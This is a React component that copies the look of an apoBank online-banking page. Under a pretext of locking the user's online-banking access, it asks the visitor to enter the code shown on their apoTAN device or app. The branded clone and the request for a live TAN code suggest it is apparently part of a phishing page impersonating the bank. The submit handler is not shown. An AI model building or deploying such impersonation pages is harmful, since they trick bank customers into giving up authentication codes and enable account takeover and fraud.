import { useState } from "react";
import { ChevronRight } from "lucide-react";
import { useNavigate } from "react-router-dom";
import apoBankLogo from "@/assets/apobank-logo.svg";
import phototanImg from "@/assets/phototan.png";
import Footer from "@/components/Footer";
import ContactSection from "@/components/ContactSection";
import { Button } from "@/components/ui/button";

const PinOffline = () => {
  const navigate = useNavigate();
  const [code, setCode] = useState("");
  const valid = code.length === 6 || code.length === 8;

  return (
    <div className="min-h-screen bg-[#f5f5f5] flex flex-col">
      <header className="w-full border-b border-border/40 bg-white">
        <div className="max-w-6xl mx-auto px-4 py-3 flex items-center gap-3">
          <img src={apoBankLogo} alt="apoBank Logo" className="h-14 w-auto" />
        </div>
      </header>

      <div className="bg-white border-b border-border/40">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 py-4">
          <div className="flex items-center gap-2 text-sm text-foreground">
            <button onClick={() => navigate("/")} className="hover:underline">Startseite</button>
            <ChevronRight className="h-3 w-3" />
            <span className="text-foreground/70">Online-Banking Zugang sperren</span>
          </div>
          <h1 className="mt-2 text-2xl sm:text-3xl font-normal text-[#1a1a1a]">Online-Banking Zugang sperren</h1>
        </div>
      </div>

      <main className="flex-1 px-3 sm:px-4 py-6 sm:py-8">
        <div className="max-w-3xl mx-auto">
          <div className="bg-white border border-border/60 rounded-sm px-6 py-6 shadow-sm">
            <h2 className="text-2xl sm:text-3xl font-normal text-[#0f4c92] leading-snug">
              Online-Banking Zugang sperren: Bestätigung mit apoTAN
            </h2>
          </div>

          <div className="bg-[#eef1f5] border border-border/60 border-t-0 rounded-sm px-6 py-8">
            <p className="text-sm text-foreground mb-6">
              Bitte geben Sie den Code ein, der auf Ihrem apoTAN Gerät oder Ihrer apoTAN App angezeigt wird.
            </p>

            <div className="flex justify-center mb-8">
              <img src={phototanImg} alt="apoTAN Grafik" className="w-44 h-44 object-contain border border-black" />
            </div>

            <div className="flex items-center gap-6 mb-6">
              <label className="text-sm font-semibold text-foreground w-24">Code</label>
              <input
                type="text"
                value={code}
                onChange={(e) => setCode(e.target.value)}
                className="flex-1 border border-border/70 bg-white rounded-sm px-3 py-2 text-sm outline-none focus:ring-2 focus:ring-[#a0b0c8]"
              />
            </div>

            <div className="flex justify-end gap-3">
              <Button
                variant="outline"
                className="px-8 bg-white hover:bg-white border-[#0f4c92] text-[#0f4c92] hover:text-[#0f4c92] rounded-sm"
                onClick={() => navigate(-1)}
              >
                Zurück
              </Button>
              <Button
                disabled={!valid}
                className={`px-8 rounded-sm disabled:opacity-100 ${valid ? "bg-white text-[#0f4c92] border border-[#0f4c92] hover:bg-white" : "bg-[#e6e8eb] text-foreground/60 hover:bg-[#e6e8eb]"}`}
              >
                Senden
              </Button>
            </div>
          </div>
        </div>
      </main>

      <ContactSection />
      <Footer />
    </div>
  );
};

export default PinOffline;
